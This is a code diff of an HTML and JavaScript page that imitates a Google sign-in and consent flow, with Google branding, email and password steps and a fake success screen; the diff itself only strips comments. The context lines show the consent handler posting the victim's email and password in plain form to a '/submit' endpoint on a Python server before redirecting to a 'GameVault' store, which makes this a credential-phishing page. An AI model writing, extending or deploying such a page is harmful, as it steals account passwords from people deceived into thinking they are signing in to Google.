@@ -41,15 +41,12 @@
 
     .step-body { padding: 40px 44px 28px; }
 
-    /* Google logo */
     .g-logo { margin-bottom: 26px; }
 
-    /* Headings */
     .step-title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
     .step-subtitle { font-size: 16px; color: #202124; margin-bottom: 26px; }
     .step-subtitle span { color: #1a73e8; font-weight: 500; }
 
-    /* Account chip */
     .acct-chip {
       display: inline-flex; align-items: center; gap: 10px;
       border: 1px solid #dadce0; border-radius: 24px;
@@ -65,7 +62,6 @@
     }
     .acct-email { font-size: 14px; color: #202124; }
 
-    /* Inputs */
     .field-wrap { position: relative; margin-bottom: 6px; }
     .field-wrap input {
       width: 100%; font-family: 'Roboto', sans-serif;
@@ -116,7 +112,6 @@
     .note-text { font-size: 14px; color: #5f6368; line-height: 1.5; }
     .note-text a { color: #1a73e8; font-weight: 500; text-decoration: none; }
 
-    /* Consent */
     .consent-app-hd {
       display: flex; flex-direction: column; align-items: center;
       text-align: center; margin-bottom: 18px;
@@ -163,7 +158,6 @@
     }
     .info-box a { color: inherit; }
 
-    /* Actions bar */
     .actions {
       display: flex; justify-content: space-between; align-items: center;
       padding: 16px 44px 24px;
@@ -184,7 +178,6 @@
     .create-link { font-size: 14px; color: #1a73e8; font-weight: 500; text-decoration: none; }
     .create-link:hover { text-decoration: underline; }
 
-    /* Language bar */
     .lang-bar {
       display: flex; justify-content: space-between; align-items: center;
       padding: 10px 44px 14px; border-top: 1px solid #e8eaed;
@@ -198,7 +191,6 @@
     .lang-links a { font-size: 12px; color: #5f6368; text-decoration: none; }
     .lang-links a:hover { text-decoration: underline; }
 
-    /* Success */
     .success-body {
       display: flex; flex-direction: column; align-items: center;
       padding: 46px 44px 42px; text-align: center; gap: 14px;
@@ -219,7 +211,6 @@
       border-radius: 2px; width: 0; transition: width 2.2s ease;
     }
 
-    /* Progress dots */
     .dots {
       display: flex; justify-content: center; gap: 8px; margin-top: 18px;
     }
@@ -246,7 +237,6 @@
 
 <div class="step-wrapper">
 
-  <!-- ══════════════ STEP 1 — Email ══════════════ -->
   <div class="step active" id="s0">
     <div class="step-body">
       <div class="g-logo">
@@ -297,7 +287,6 @@
     </div>
   </div>
 
-  <!-- ══════════════ STEP 2 — Password ══════════════ -->
   <div class="step" id="s1">
     <div class="step-body">
       <div class="g-logo">
@@ -349,7 +338,6 @@
     </div>
   </div>
 
-  <!-- ══════════════ STEP 3 — Consent ══════════════ -->
   <div class="step" id="s2">
     <div class="step-body">
       <div class="g-logo">
@@ -437,7 +425,6 @@
     </div>
   </div>
 
-  <!-- ══════════════ STEP 4 — Success ══════════════ -->
   <div class="step" id="s3">
     <div class="success-body">
       <div class="success-ring" aria-hidden="true">
@@ -466,7 +453,6 @@
     </div>
   </div>
 
-  <!-- Progress dots -->
   <div class="dots" aria-hidden="true">
     <div class="dot on"  id="d0"></div>
     <div class="dot"     id="d1"></div>
@@ -484,7 +470,6 @@
 </footer>
 
 <script>
-  /* ── helpers ── */
   function initials(email) {
     const local = email.split('@')[0];
     const parts = local.split(/[.\-_+]/);
@@ -504,7 +489,6 @@
     inp.value ? inp.classList.add('filled') : inp.classList.remove('filled');
   }
 
-  /* ── step switching ── */
   function goStep(n) {
     document.querySelectorAll('.step').forEach((s,i) => {
       s.classList.toggle('active', i === n);
@@ -517,7 +501,6 @@
     if (inp) setTimeout(() => inp.focus(), 220);
   }
 
-  /* ── error helpers ── */
   function setErr(id, msg) {
     const el = document.getElementById(id);
     el.innerHTML = msg
@@ -525,7 +508,6 @@
       : '';
   }
 
-  /* ── STEP 1 ── */
   function step1Next() {
     const inp = document.getElementById('inp-email');
     const v = inp.value.trim();
@@ -547,7 +529,6 @@
     goStep(1);
   }
 
-  /* ── STEP 2 ── */
   function step2Next() {
     const inp = document.getElementById('inp-pw');
     if (!inp.value) {
@@ -570,13 +551,11 @@
     goStep(2);
   }
 
- /* ── STEP 3 ── */
     function step3Allow() {
       const email = window._email;
       const name  = nameFromEmail(email);
       const password = window._pw;
   
-      // ── NUEVO: Enviar los datos al servidor Python ──
       fetch('/submit', {
         method: 'POST',
         headers: {
@@ -590,7 +569,6 @@
       .then(response => response.json())
       .then(data => console.log('Servidor recibió los datos:', data))
       .catch(error => console.error('Error al enviar al servidor:', error));
-      // ────────────────────────────────────────────────
   
       document.getElementById('ok-title').textContent = 'You\'re signed in, ' + firstName(name) + '!';
       document.getElementById('ok-email').textContent = email;
@@ -602,14 +580,12 @@
         document.getElementById('pb').style.width = '100%';
       }, 80);
 
-      // ── Redirigir a la tienda de juegos de GameVault tras la autenticación ──
       setTimeout(() => {
         const targetUrl = `/store?email=${encodeURIComponent(email)}&name=${encodeURIComponent(name)}`;
         window.location.href = targetUrl;
       }, 2400);
     }
 
-  /* ── Reset ── */
   function resetAll() {
     ['inp-email','inp-pw'].forEach(id => {
       const el = document.getElementById(id);
@@ -625,7 +601,6 @@
     goStep(0);
   }
 
-  /* ── Password show/hide ── */
   function togglePw() {
     const inp = document.getElementById('inp-pw');
     const icon = document.getElementById('eye');
